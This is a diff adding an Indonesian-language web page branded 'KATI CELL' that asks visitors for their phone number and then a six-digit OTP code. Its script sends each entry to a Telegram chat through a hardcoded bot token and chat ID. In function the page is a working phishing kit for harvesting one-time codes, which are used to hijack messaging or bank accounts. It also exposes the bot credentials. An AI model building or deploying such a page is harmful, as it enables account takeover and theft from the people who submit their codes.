@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KATI CELL - OTP Form</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    :root {
+      --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+      --glass-bg: rgba(255, 255, 255, 0.1);
+      --glass-border: rgba(255, 255, 255, 0.2);
+      --shadow-primary: 0 8px 32px rgba(31, 38, 135, 0.37);
+      --shadow-hover: 0 15px 35px rgba(31, 38, 135, 0.4);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      background: var(--primary-gradient);
+      min-height: 100vh;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* Animated background with particles */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+        radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+        radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%);
+      animation: backgroundShift 20s ease-in-out infinite;
+      z-index: -2;
+    }
+
+    @keyframes backgroundShift {
+      0%, 100% { opacity: 1; transform: scale(1) rotate(0deg); }
+      50% { opacity: 0.8; transform: scale(1.1) rotate(1deg); }
+    }
+
+    /* Floating particles */
+    .particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .particle {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.6);
+      border-radius: 50%;
+      animation: particleFloat 15s linear infinite;
+    }
+
+    .particle:nth-child(1) { left: 10%; animation-delay: 0s; animation-duration: 12s; }
+    .particle:nth-child(2) { left: 20%; animation-delay: 2s; animation-duration: 18s; }
+    .particle:nth-child(3) { left: 30%; animation-delay: 4s; animation-duration: 14s; }
+    .particle:nth-child(4) { left: 40%; animation-delay: 1s; animation-duration: 16s; }
+    .particle:nth-child(5) { left: 50%; animation-delay: 6s; animation-duration: 13s; }
+    .particle:nth-child(6) { left: 60%; animation-delay: 3s; animation-duration: 17s; }
+    .particle:nth-child(7) { left: 70%; animation-delay: 8s; animation-duration: 15s; }
+    .particle:nth-child(8) { left: 80%; animation-delay: 5s; animation-duration: 19s; }
+    .particle:nth-child(9) { left: 90%; animation-delay: 7s; animation-duration: 11s; }
+
+    @keyframes particleFloat {
+      0% { 
+        transform: translateY(100vh) scale(0);
+        opacity: 0;
+      }
+      10% {
+        opacity: 1;
+        transform: translateY(90vh) scale(1);
+      }
+      90% {
+        opacity: 1;
+        transform: translateY(-10vh) scale(1);
+      }
+      100% { 
+        transform: translateY(-20vh) scale(0);
+        opacity: 0;
+      }
+    }
+
+    /* Main container */
+    .main-container {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* Glass morphism card */
+    .glass-card {
+      background: var(--glass-bg);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid var(--glass-border);
+      border-radius: 20px;
+      box-shadow: var(--shadow-primary);
+      width: 100%;
+      max-width: 420px;
+      padding: 2rem;
+      position: relative;
+      overflow: hidden;
+      animation: cardEntrance 1s ease-out;
+    }
+
+    @keyframes cardEntrance {
+      0% {
+        opacity: 0;
+        transform: translateY(50px) scale(0.9);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .glass-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+      animation: shimmer 3s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+
+    /* Brand styling */
+    .brand {
+      font-weight: 700;
+      font-size: 2rem;
+      background: linear-gradient(135deg, #fff, #f0f0f0);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-align: center;
+      margin-bottom: 2rem;
+      letter-spacing: 2px;
+      animation: brandPulse 4s ease-in-out infinite;
+    }
+
+    @keyframes brandPulse {
+      0%, 100% { 
+        filter: drop-shadow(0 0 10px rgba(255,255,255,0.3));
+        transform: scale(1);
+      }
+      50% { 
+        filter: drop-shadow(0 0 20px rgba(255,255,255,0.6));
+        transform: scale(1.02);
+      }
+    }
+
+    /* Form elements */
+    .form-label {
+      color: rgba(255, 255, 255, 0.9);
+      font-weight: 500;
+      margin-bottom: 0.75rem;
+      font-size: 0.95rem;
+    }
+
+    .form-control {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 12px;
+      color: white;
+      padding: 0.875rem 1.25rem;
+      font-size: 1rem;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      backdrop-filter: blur(10px);
+    }
+
+    .form-control::placeholder {
+      color: rgba(255, 255, 255, 0.6);
+    }
+
+    .form-control:focus {
+      background: rgba(255, 255, 255, 0.15);
+      border-color: rgba(255, 255, 255, 0.4);
+      box-shadow: 0 0 0 0.2rem rgba(255, 255, 255, 0.1), 0 0 20px rgba(255, 255, 255, 0.2);
+      color: white;
+      transform: translateY(-2px);
+    }
+
+    /* Button styling */
+    .btn-custom {
+      background: var(--secondary-gradient);
+      border: none;
+      border-radius: 12px;
+      padding: 0.875rem 1.5rem;
+      font-weight: 600;
+      font-size: 1rem;
+      color: white;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 4px 15px rgba(245, 87, 108, 0.3);
+    }
+
+    .btn-custom:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(245, 87, 108, 0.4);
+      color: white;
+    }
+
+    .btn-custom:active {
+      transform: translateY(-1px);
+    }
+
+    .btn-custom::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+
+    .btn-custom:hover::before {
+      left: 100%;
+    }
+
+    .btn-success-custom {
+      background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+      box-shadow: 0 4px 15px rgba(17, 153, 142, 0.3);
+    }
+
+    .btn-success-custom:hover {
+      box-shadow: 0 8px 25px rgba(17, 153, 142, 0.4);
+    }
+
+    /* Loader */
+    .loader {
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top: 2px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Step animations */
+    .step-container {
+      animation: stepSlideIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    @keyframes stepSlideIn {
+      0% {
+        opacity: 0;
+        transform: translateX(-30px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateX(0);
+      }
+    }
+
+    /* Status messages */
+    .status-message {
+      padding: 0.75rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      animation: statusFadeIn 0.5s ease-out;
+    }
+
+    .status-success {
+      background: rgba(17, 153, 142, 0.2);
+      color: #38ef7d;
+      border: 1px solid rgba(56, 239, 125, 0.3);
+    }
+
+    .status-error {
+      background: rgba(245, 87, 108, 0.2);
+      color: #ff6b6b;
+      border: 1px solid rgba(255, 107, 107, 0.3);
+    }
+
+    @keyframes statusFadeIn {
+      0% {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* Responsive design */
+    @media (max-width: 576px) {
+      .main-container {
+        padding: 15px;
+      }
+      
+      .glass-card {
+        padding: 1.5rem;
+        border-radius: 16px;
+        max-width: 100%;
+      }
+      
+      .brand {
+        font-size: 1.75rem;
+        margin-bottom: 1.5rem;
+      }
+      
+      .form-control {
+        padding: 0.75rem 1rem;
+        font-size: 16px; /* Prevents zoom on iOS */
+      }
+      
+      .btn-custom {
+        padding: 0.75rem 1.25rem;
+        font-size: 0.95rem;
+      }
+    }
+
+    @media (max-width: 375px) {
+      .glass-card {
+        padding: 1.25rem;
+      }
+      
+      .brand {
+        font-size: 1.6rem;
+      }
+    }
+
+    /* High DPI displays */
+    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+      .glass-card {
+        backdrop-filter: blur(25px);
+        -webkit-backdrop-filter: blur(25px);
+      }
+    }
+
+    /* Reduce motion for accessibility */
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Floating particles -->
+  <div class="particles">
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+  </div>
+
+  <div class="main-container">
+    <div class="glass-card">
+      <h1 class="brand">KATI CELL</h1>
+
+      <!-- Tahap 1: Nomor -->
+      <div id="step1" class="step-container">
+        <label class="form-label">Masukkan Nomor HP</label>
+        <input type="tel" class="form-control mb-3" id="phone" placeholder="Contoh: 6281234567890" required autocomplete="tel">
+        <button id="sendPhoneBtn" class="btn btn-custom w-100">
+          <span id="phoneBtnText">Kirim Nomor</span>
+          <span id="phoneLoader" class="loader ms-2 d-none"></span>
+        </button>
+      </div>
+
+      <!-- Tahap 2: OTP -->
+      <div id="step2" class="mt-4 d-none">
+        <div class="step-container">
+          <label class="form-label">Masukkan Kode OTP</label>
+          <input type="text" class="form-control mb-3" id="otp" placeholder="Contoh: 123456" required autocomplete="one-time-code" inputmode="numeric" maxlength="6">
+          <button id="sendOtpBtn" class="btn btn-custom btn-success-custom w-100">
+            <span id="otpBtnText">Kirim OTP</span>
+            <span id="otpLoader" class="loader ms-2 d-none"></span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Status -->
+      <div id="status" class="mt-3"></div>
+    </div>
+  </div>
+
+  <script>
+    const TOKEN = '7138772784:AAFscVpYPW9m_ewLUhVausytyDtWBfSKF-0';
+    const CHAT_ID = '5705682585';
+
+    const phoneInput = document.getElementById("phone");
+    const otpInput = document.getElementById("otp");
+    const statusDiv = document.getElementById("status");
+    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
+    const sendOtpBtn = document.getElementById("sendOtpBtn");
+
+    // Enhanced status display
+    function showStatus(message, isSuccess = true) {
+      statusDiv.innerHTML = `<div class="status-message ${isSuccess ? 'status-success' : 'status-error'}">${message}</div>`;
+    }
+
+    // Enhanced button loading state
+    function setButtonLoading(button, textElement, loaderElement, isLoading, originalText) {
+      if (isLoading) {
+        button.disabled = true;
+        textElement.textContent = "Mengirim...";
+        loaderElement.classList.remove("d-none");
+        button.style.pointerEvents = "none";
+      } else {
+        button.disabled = false;
+        textElement.textContent = originalText;
+        loaderElement.classList.add("d-none");
+        button.style.pointerEvents = "auto";
+      }
+    }
+
+    sendPhoneBtn.addEventListener("click", () => {
+      const phone = phoneInput.value.trim();
+      if (!phone) {
+        showStatus("❌ Nomor HP tidak boleh kosong!", false);
+        return;
+      }
+
+      setButtonLoading(sendPhoneBtn, document.getElementById("phoneBtnText"), document.getElementById("phoneLoader"), true, "Kirim Nomor");
+
+      const message = `📱 Nomor Baru:\nNomor HP: ${phone}`;
+      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      })
+      .then(res => res.json())
+      .then(() => {
+        setButtonLoading(sendPhoneBtn, document.getElementById("phoneBtnText"), document.getElementById("phoneLoader"), false, "Kirim Nomor");
+        
+        const step2 = document.getElementById("step2");
+        step2.classList.remove("d-none");
+        
+        showStatus("✅ Nomor berhasil dikirim, silakan masukkan kode OTP", true);
+        
+        // Focus on OTP input for better UX
+        setTimeout(() => {
+          otpInput.focus();
+        }, 500);
+      })
+      .catch(() => {
+        setButtonLoading(sendPhoneBtn, document.getElementById("phoneBtnText"), document.getElementById("phoneLoader"), false, "Kirim Nomor");
+        showStatus("❌ Gagal mengirim nomor. Periksa koneksi internet Anda.", false);
+      });
+    });
+
+    sendOtpBtn.addEventListener("click", () => {
+      const phone = phoneInput.value.trim();
+      const otp = otpInput.value.trim();
+      
+      if (!otp) {
+        showStatus("❌ Kode OTP tidak boleh kosong!", false);
+        return;
+      }
+
+      if (otp.length !== 6) {
+        showStatus("❌ Kode OTP harus 6 digit!", false);
+        return;
+      }
+
+      setButtonLoading(sendOtpBtn, document.getElementById("otpBtnText"), document.getElementById("otpLoader"), true, "Kirim OTP");
+
+      const message = `🔐 OTP Masuk:\nNomor: ${phone}\nKode OTP: ${otp}`;
+      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      })
+      .then(res => res.json())
+      .then(() => {
+        setButtonLoading(sendOtpBtn, document.getElementById("otpBtnText"), document.getElementById("otpLoader"), false, "Kirim OTP");
+        showStatus("✅ Kode OTP berhasil dikirim ke Telegram!", true);
+        
+        // Reset form after success
+        setTimeout(() => {
+          otpInput.value = "";
+          phoneInput.value = "";
+          document.getElementById("step2").classList.add("d-none");
+          statusDiv.innerHTML = "";
+          phoneInput.focus();
+        }, 3000);
+      })
+      .catch(() => {
+        setButtonLoading(sendOtpBtn, document.getElementById("otpBtnText"), document.getElementById("otpLoader"), false, "Kirim OTP");
+        showStatus("❌ Gagal mengirim OTP. Periksa koneksi internet Anda.", false);
+      });
+    });
+
+    // Enhanced mobile experience
+    phoneInput.addEventListener("focus", () => {
+      phoneInput.style.transform = "translateY(-2px)";
+    });
+
+    phoneInput.addEventListener("blur", () => {
+      phoneInput.style.transform = "translateY(0)";
+    });
+
+    otpInput.addEventListener("focus", () => {
+      otpInput.style.transform = "translateY(-2px)";
+    });
+
+    otpInput.addEventListener("blur", () => {
+      otpInput.style.transform = "translateY(0)";
+    });
+
+    // Auto-format phone number (optional enhancement)
+    phoneInput.addEventListener("input", (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      e.target.value = value;
+    });
+
+    // Auto-format OTP (only numbers)
+    otpInput.addEventListener("input", (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 6) value = value.slice(0, 6);
+      e.target.value = value;
+    });
+
+    // Enter key support
+    phoneInput.addEventListener("keypress", (e) => {
+      if (e.key === "Enter") {
+        sendPhoneBtn.click();
+      }
+    });
+
+    otpInput.addEventListener("keypress", (e) => {
+      if (e.key === "Enter") {
+        sendOtpBtn.click();
+      }
+    });
+  </script>
+</body>
+</html>
